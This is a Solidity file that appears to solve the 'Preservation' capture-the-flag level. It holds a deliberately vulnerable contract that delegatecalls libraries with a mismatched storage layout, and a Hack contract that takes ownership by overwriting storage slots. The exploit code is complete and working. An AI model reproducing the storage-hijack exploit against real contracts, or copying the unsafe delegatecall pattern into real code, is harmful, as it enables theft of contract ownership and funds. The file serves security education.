// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";

/**
This contract utilizes a library to store two different times for two different timezones.
 The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, 
how it works, how it can be used to delegate operations to on-chain.
 libraries, and what implications it has on execution scope.
Understanding what it means for delegatecall to be context-preserving.
Understanding how storage variables are stored and accessed.
Understanding how casting works between different data types.
**/
contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}


interface PreservationI {
  function setFirstTime(uint _timeStamp) external;
  function setSecondTime(uint _timeStamp) external;
}

contract Hack {

  address timeZone1Library;
  address timeZone2Library;
  address owner; 
  uint storedTime;
  PreservationI preservation;

  constructor(address _add) {
    preservation = PreservationI(_add);
  }

  function setTime(uint _timeStamp) public {
    timeZone1Library = address(0);
    timeZone2Library = address(0);
    owner = tx.origin;
    storedTime = _timeStamp;
  }

  /**
    https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-5-calling-other-contracts-visibility-state-access/topic/delegatecall/
    Delegate call uses storage slot of original contract.
    we can hack this in 2 steps.
    1. call firstTime and set storage slot 0 to this contract's address.
    2. call firstTime again and set storage slot 2 to tx.origin to claim ownership.

  **/
  function hack() public {
    preservation.setFirstTime(uint(uint160(address(this)))); // this conversion might not work with < 0.8.0, but that's not the point of this level
    preservation.setFirstTime(block.timestamp);
  }

}
